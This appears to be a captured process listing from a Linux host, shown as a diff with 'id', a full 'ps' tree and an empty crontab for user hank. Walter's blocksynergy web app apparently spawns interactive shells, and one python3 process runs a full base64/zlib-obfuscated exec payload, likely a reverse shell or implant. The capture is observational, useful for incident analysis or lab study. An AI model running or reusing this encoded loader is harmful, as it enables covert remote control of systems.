@@ -1,0 +1,302 @@
+== id ==
+uid=1001(hank) gid=1003(hank) groups=1003(hank),1001(developers)
+== ps full tree ==
+      1       0 root     /sbin/init
+      2       0 root     [kthreadd]
+      3       2 root     [pool_workqueue_release]
+      4       2 root     [kworker/R-rcu_g]
+      5       2 root     [kworker/R-rcu_p]
+      6       2 root     [kworker/R-slub_]
+      7       2 root     [kworker/R-netns]
+      9       2 root     [kworker/0:0H-kblockd]
+     12       2 root     [kworker/R-mm_pe]
+     13       2 root     [rcu_tasks_kthread]
+     14       2 root     [rcu_tasks_rude_kthread]
+     15       2 root     [rcu_tasks_trace_kthread]
+     16       2 root     [ksoftirqd/0]
+     17       2 root     [rcu_preempt]
+     18       2 root     [migration/0]
+     19       2 root     [idle_inject/0]
+     20       2 root     [cpuhp/0]
+     21       2 root     [cpuhp/1]
+     22       2 root     [idle_inject/1]
+     23       2 root     [migration/1]
+     24       2 root     [ksoftirqd/1]
+     26       2 root     [kworker/1:0H-kblockd]
+     27       2 root     [kdevtmpfs]
+     28       2 root     [kworker/R-inet_]
+     29       2 root     [kauditd]
+     30       2 root     [khungtaskd]
+     33       2 root     [oom_reaper]
+     34       2 root     [kworker/R-write]
+     35       2 root     [kcompactd0]
+     36       2 root     [ksmd]
+     38       2 root     [khugepaged]
+     39       2 root     [kworker/R-kinte]
+     40       2 root     [kworker/R-kbloc]
+     41       2 root     [kworker/R-blkcg]
+     42       2 root     [irq/9-acpi]
+     43       2 root     [kworker/R-tpm_d]
+     44       2 root     [kworker/R-ata_s]
+     45       2 root     [kworker/R-md]
+     46       2 root     [kworker/R-md_bi]
+     47       2 root     [kworker/R-edac-]
+     48       2 root     [kworker/R-devfr]
+     49       2 root     [watchdogd]
+     50       2 root     [kworker/R-quota]
+     52       2 root     [kswapd0]
+     53       2 root     [ecryptfs-kthread]
+     54       2 root     [kworker/R-kthro]
+     55       2 root     [irq/24-pciehp]
+     56       2 root     [irq/25-pciehp]
+     57       2 root     [irq/26-pciehp]
+     58       2 root     [irq/27-pciehp]
+     59       2 root     [irq/28-pciehp]
+     60       2 root     [irq/29-pciehp]
+     61       2 root     [irq/30-pciehp]
+     62       2 root     [irq/31-pciehp]
+     63       2 root     [irq/32-pciehp]
+     64       2 root     [irq/33-pciehp]
+     65       2 root     [irq/34-pciehp]
+     66       2 root     [irq/35-pciehp]
+     67       2 root     [irq/36-pciehp]
+     68       2 root     [irq/37-pciehp]
+     69       2 root     [irq/38-pciehp]
+     70       2 root     [irq/39-pciehp]
+     71       2 root     [irq/40-pciehp]
+     72       2 root     [irq/41-pciehp]
+     73       2 root     [irq/42-pciehp]
+     74       2 root     [irq/43-pciehp]
+     75       2 root     [irq/44-pciehp]
+     76       2 root     [irq/45-pciehp]
+     77       2 root     [irq/46-pciehp]
+     78       2 root     [irq/47-pciehp]
+     79       2 root     [irq/48-pciehp]
+     80       2 root     [irq/49-pciehp]
+     81       2 root     [irq/50-pciehp]
+     82       2 root     [irq/51-pciehp]
+     83       2 root     [irq/52-pciehp]
+     84       2 root     [irq/53-pciehp]
+     85       2 root     [irq/54-pciehp]
+     86       2 root     [irq/55-pciehp]
+     87       2 root     [kworker/R-acpi_]
+     88       2 root     [scsi_eh_0]
+     89       2 root     [kworker/R-scsi_]
+     90       2 root     [scsi_eh_1]
+     91       2 root     [kworker/R-scsi_]
+     96       2 root     [kworker/R-mld]
+     97       2 root     [kworker/0:1H]
+     98       2 root     [kworker/R-ipv6_]
+    105       2 root     [kworker/R-kstrp]
+    107       2 root     [kworker/u5:0]
+    120       2 root     [kworker/R-charg]
+    186       2 root     [scsi_eh_2]
+    187       2 root     [kworker/R-scsi_]
+    188       2 root     [scsi_eh_3]
+    189       2 root     [kworker/R-scsi_]
+    190       2 root     [scsi_eh_4]
+    191       2 root     [kworker/R-scsi_]
+    192       2 root     [scsi_eh_5]
+    193       2 root     [kworker/R-scsi_]
+    194       2 root     [scsi_eh_6]
+    195       2 root     [kworker/R-scsi_]
+    196       2 root     [scsi_eh_7]
+    197       2 root     [kworker/R-scsi_]
+    198       2 root     [scsi_eh_8]
+    199       2 root     [kworker/R-scsi_]
+    200       2 root     [scsi_eh_9]
+    201       2 root     [kworker/R-scsi_]
+    202       2 root     [scsi_eh_10]
+    203       2 root     [kworker/R-scsi_]
+    204       2 root     [scsi_eh_11]
+    205       2 root     [kworker/R-scsi_]
+    206       2 root     [scsi_eh_12]
+    207       2 root     [kworker/R-scsi_]
+    208       2 root     [scsi_eh_13]
+    209       2 root     [kworker/R-scsi_]
+    210       2 root     [scsi_eh_14]
+    211       2 root     [kworker/R-scsi_]
+    212       2 root     [scsi_eh_15]
+    213       2 root     [kworker/R-scsi_]
+    214       2 root     [scsi_eh_16]
+    215       2 root     [kworker/R-scsi_]
+    216       2 root     [scsi_eh_17]
+    217       2 root     [kworker/R-scsi_]
+    218       2 root     [scsi_eh_18]
+    219       2 root     [kworker/R-scsi_]
+    220       2 root     [scsi_eh_19]
+    221       2 root     [kworker/R-scsi_]
+    222       2 root     [scsi_eh_20]
+    223       2 root     [kworker/R-scsi_]
+    224       2 root     [scsi_eh_21]
+    225       2 root     [kworker/R-scsi_]
+    226       2 root     [scsi_eh_22]
+    227       2 root     [kworker/R-scsi_]
+    228       2 root     [scsi_eh_23]
+    229       2 root     [kworker/R-scsi_]
+    230       2 root     [scsi_eh_24]
+    231       2 root     [kworker/R-scsi_]
+    232       2 root     [scsi_eh_25]
+    233       2 root     [kworker/R-scsi_]
+    234       2 root     [scsi_eh_26]
+    235       2 root     [kworker/R-scsi_]
+    236       2 root     [scsi_eh_27]
+    237       2 root     [kworker/R-scsi_]
+    238       2 root     [scsi_eh_28]
+    239       2 root     [kworker/R-scsi_]
+    240       2 root     [scsi_eh_29]
+    241       2 root     [kworker/R-scsi_]
+    242       2 root     [scsi_eh_30]
+    243       2 root     [kworker/R-scsi_]
+    244       2 root     [scsi_eh_31]
+    245       2 root     [kworker/R-scsi_]
+    282       2 root     [kworker/R-kdmfl]
+    302       2 root     [kworker/R-dm_bu]
+    315       2 root     [kworker/R-raid5]
+    348       2 root     [jbd2/dm-0-8]
+    349       2 root     [kworker/R-ext4-]
+    392       2 root     [psimon]
+    397       1 root     /usr/lib/systemd/systemd-journald
+    433       1 root     /usr/lib/systemd/systemd-udevd
+    458       2 root     [psimon]
+    592       2 root     [jbd2/sda2-8]
+    593       2 root     [kworker/R-ext4-]
+    633       2 root     [irq/60-vmw_vmci]
+    639       1 systemd+ /usr/lib/systemd/systemd-resolved
+    641       2 root     [irq/61-vmw_vmci]
+    643       2 root     [irq/62-vmw_vmci]
+    644       1 systemd+ /usr/lib/systemd/systemd-timesyncd
+    650       1 root     /sbin/auditd
+    652     650 _laurel  /usr/local/sbin/laurel --config /etc/laurel/config.toml
+    698       2 root     [audit_prune_tree]
+    720       2 root     [irq/16-vmwgfx]
+    722       2 root     [kworker/R-ttm]
+    764       2 root     [kworker/R-crypt]
+    768       1 root     /usr/bin/VGAuthService
+    769       1 root     /usr/bin/vmtoolsd
+    788       1 root     dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+    831       1 message+ @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+    848       1 polkitd  /usr/lib/polkit-1/polkitd --no-debug
+    861       1 root     /usr/lib/systemd/systemd-logind
+    862       1 root     /usr/libexec/udisks2/udisksd
+    988       1 root     /usr/sbin/ModemManager
+   1159       1 syslog   /usr/sbin/rsyslogd -n -iNONE
+   1482       1 walter   /opt/blocksynergy/venv/bin/python3 /opt/blocksynergy/app.py
+   1484       1 hank     /opt/staging/smart_contracts/venv/bin/python3 /opt/staging/smart_contracts/dev_app.py
+   1486       1 root     /usr/sbin/cron -f -P
+   1487       1 root     /bin/bash /opt/backup/restore_daemon.sh
+   1490       1 root     /usr/bin/containerd
+   1514       1 root     /sbin/agetty -o -p -- \u --noclear - linux
+   1558       1 root     /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+   1792       1 contain+ /usr/bin/docker compose -f /srv/container/docker-compose.yml up
+   1806    1792 contain+ /usr/libexec/docker/cli-plugins/docker-compose compose -f /srv/container/docker-compose.yml up
+   8516       1 root     sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+  29910       2 root     [kworker/u4:0-ext4-rsv-conversion]
+  32833    1482 walter   [sh] <defunct>
+  32837       1 walter   bash
+  32839   32837 walter   /usr/bin/bash
+  32871    1482 walter   [sh] <defunct>
+  32875       1 walter   bash
+  32878   32875 walter   sh -i
+  32886   32839 walter   /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("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")))
+  32887   32886 walter   /usr/bin/bash -i
+  38458       1 root     /usr/libexec/upowerd
+  38577    8516 root     sshd: hank [priv]
+  38583       1 hank     /usr/lib/systemd/systemd --user
+  38584   38583 hank     (sd-pam)
+  38697   38577 hank     sshd: hank@pts/1
+  38700   38697 hank     -bash
+  46615       2 root     [kworker/u4:3-events_power_efficient]
+  52507       2 root     [kworker/u4:2-events_power_efficient]
+  53944       2 root     [kworker/1:1H]
+  54355       2 root     [kworker/0:2-rcu_gp]
+  55183       2 root     [kworker/u4:4-ext4-rsv-conversion]
+  55184       2 root     [kworker/u4:5-events_power_efficient]
+  63669    8516 root     sshd: hank [priv]
+  63724   63669 hank     sshd: hank@pts/2
+  63725   63724 hank     -bash
+  65623       2 root     [kworker/0:3-cgroup_free]
+  68876       2 root     [kworker/1:2-inet_frag_wq]
+  69414       2 root     [kworker/u4:1-ext4-rsv-conversion]
+  71604       2 root     [kworker/u4:7-events_power_efficient]
+  75158       2 root     [kworker/0:0-events]
+  75753       2 root     [kworker/1:0-events]
+  82588       2 root     [kworker/1:1]
+  82605       1 root     /usr/bin/containerd-shim-runc-v2 -namespace moby -id 7f436d65eef670291aae56739b949f7a27a13703a3c563f3e2db56f571e40429 -address /run/containerd/containerd.sock
+  82633   82605 root     /usr/local/bin/container_daemon /srv/daemon.conf
+  82679    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 15432 -container-ip 172.18.0.2 -container-port 15432 -use-listen-fd
+  82696    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47400 -container-ip 172.18.0.2 -container-port 47400 -use-listen-fd
+  82715    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47401 -container-ip 172.18.0.2 -container-port 47401 -use-listen-fd
+  82733    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47402 -container-ip 172.18.0.2 -container-port 47402 -use-listen-fd
+  82750    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47403 -container-ip 172.18.0.2 -container-port 47403 -use-listen-fd
+  82767    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47404 -container-ip 172.18.0.2 -container-port 47404 -use-listen-fd
+  82784    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47405 -container-ip 172.18.0.2 -container-port 47405 -use-listen-fd
+  82803    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47406 -container-ip 172.18.0.2 -container-port 47406 -use-listen-fd
+  82820    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47407 -container-ip 172.18.0.2 -container-port 47407 -use-listen-fd
+  82838    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47408 -container-ip 172.18.0.2 -container-port 47408 -use-listen-fd
+  82855    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47409 -container-ip 172.18.0.2 -container-port 47409 -use-listen-fd
+  82871    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47410 -container-ip 172.18.0.2 -container-port 47410 -use-listen-fd
+  82887    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47411 -container-ip 172.18.0.2 -container-port 47411 -use-listen-fd
+  82904    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47412 -container-ip 172.18.0.2 -container-port 47412 -use-listen-fd
+  82921    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47413 -container-ip 172.18.0.2 -container-port 47413 -use-listen-fd
+  82939    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47414 -container-ip 172.18.0.2 -container-port 47414 -use-listen-fd
+  82954    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47415 -container-ip 172.18.0.2 -container-port 47415 -use-listen-fd
+  82970    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47416 -container-ip 172.18.0.2 -container-port 47416 -use-listen-fd
+  82987    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47417 -container-ip 172.18.0.2 -container-port 47417 -use-listen-fd
+  83002    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47418 -container-ip 172.18.0.2 -container-port 47418 -use-listen-fd
+  83018    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47419 -container-ip 172.18.0.2 -container-port 47419 -use-listen-fd
+  83039    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47420 -container-ip 172.18.0.2 -container-port 47420 -use-listen-fd
+  83068    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47421 -container-ip 172.18.0.2 -container-port 47421 -use-listen-fd
+  83095    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47422 -container-ip 172.18.0.2 -container-port 47422 -use-listen-fd
+  83114    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47423 -container-ip 172.18.0.2 -container-port 47423 -use-listen-fd
+  83132    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47424 -container-ip 172.18.0.2 -container-port 47424 -use-listen-fd
+  83150    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47425 -container-ip 172.18.0.2 -container-port 47425 -use-listen-fd
+  83170    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47426 -container-ip 172.18.0.2 -container-port 47426 -use-listen-fd
+  83214    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47427 -container-ip 172.18.0.2 -container-port 47427 -use-listen-fd
+  83233    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47428 -container-ip 172.18.0.2 -container-port 47428 -use-listen-fd
+  83249    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47429 -container-ip 172.18.0.2 -container-port 47429 -use-listen-fd
+  83265    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47430 -container-ip 172.18.0.2 -container-port 47430 -use-listen-fd
+  83282    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47431 -container-ip 172.18.0.2 -container-port 47431 -use-listen-fd
+  83302    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47432 -container-ip 172.18.0.2 -container-port 47432 -use-listen-fd
+  83320    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47433 -container-ip 172.18.0.2 -container-port 47433 -use-listen-fd
+  83338    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47434 -container-ip 172.18.0.2 -container-port 47434 -use-listen-fd
+  83355    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47435 -container-ip 172.18.0.2 -container-port 47435 -use-listen-fd
+  83372    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47436 -container-ip 172.18.0.2 -container-port 47436 -use-listen-fd
+  83389    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47437 -container-ip 172.18.0.2 -container-port 47437 -use-listen-fd
+  83406    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47438 -container-ip 172.18.0.2 -container-port 47438 -use-listen-fd
+  83422    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47439 -container-ip 172.18.0.2 -container-port 47439 -use-listen-fd
+  83438    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47440 -container-ip 172.18.0.2 -container-port 47440 -use-listen-fd
+  83457    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47441 -container-ip 172.18.0.2 -container-port 47441 -use-listen-fd
+  83475    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47442 -container-ip 172.18.0.2 -container-port 47442 -use-listen-fd
+  83493    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47443 -container-ip 172.18.0.2 -container-port 47443 -use-listen-fd
+  83509    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47444 -container-ip 172.18.0.2 -container-port 47444 -use-listen-fd
+  83530    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47445 -container-ip 172.18.0.2 -container-port 47445 -use-listen-fd
+  83546    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47446 -container-ip 172.18.0.2 -container-port 47446 -use-listen-fd
+  83565    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47447 -container-ip 172.18.0.2 -container-port 47447 -use-listen-fd
+  83582    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47448 -container-ip 172.18.0.2 -container-port 47448 -use-listen-fd
+  83598    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47449 -container-ip 172.18.0.2 -container-port 47449 -use-listen-fd
+  83614    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47450 -container-ip 172.18.0.2 -container-port 47450 -use-listen-fd
+  83629    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47451 -container-ip 172.18.0.2 -container-port 47451 -use-listen-fd
+  83645    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47452 -container-ip 172.18.0.2 -container-port 47452 -use-listen-fd
+  83660    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47453 -container-ip 172.18.0.2 -container-port 47453 -use-listen-fd
+  83676    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47454 -container-ip 172.18.0.2 -container-port 47454 -use-listen-fd
+  83692    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47455 -container-ip 172.18.0.2 -container-port 47455 -use-listen-fd
+  83709    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47456 -container-ip 172.18.0.2 -container-port 47456 -use-listen-fd
+  83726    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47457 -container-ip 172.18.0.2 -container-port 47457 -use-listen-fd
+  83741    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47458 -container-ip 172.18.0.2 -container-port 47458 -use-listen-fd
+  83757    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47459 -container-ip 172.18.0.2 -container-port 47459 -use-listen-fd
+  83773    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47460 -container-ip 172.18.0.2 -container-port 47460 -use-listen-fd
+  83788    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47461 -container-ip 172.18.0.2 -container-port 47461 -use-listen-fd
+  83803    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47462 -container-ip 172.18.0.2 -container-port 47462 -use-listen-fd
+  83819    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47463 -container-ip 172.18.0.2 -container-port 47463 -use-listen-fd
+  83835    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47464 -container-ip 172.18.0.2 -container-port 47464 -use-listen-fd
+  83851    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47465 -container-ip 172.18.0.2 -container-port 47465 -use-listen-fd
+  83867    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47466 -container-ip 172.18.0.2 -container-port 47466 -use-listen-fd
+  83883    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47467 -container-ip 172.18.0.2 -container-port 47467 -use-listen-fd
+  83899    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47468 -container-ip 172.18.0.2 -container-port 47468 -use-listen-fd
+  83919    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47469 -container-ip 172.18.0.2 -container-port 47469 -use-listen-fd
+  83939    1558 root     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 47470 -container-ip 172.18.0.2 -container-port 47470 -use-listen-fd
+  84207    1487 root     sleep 10
+  84219   38700 hank     ps -eo pid,ppid,user,args --no-headers
+== crontab -l (hank) ==
+no crontab for hank
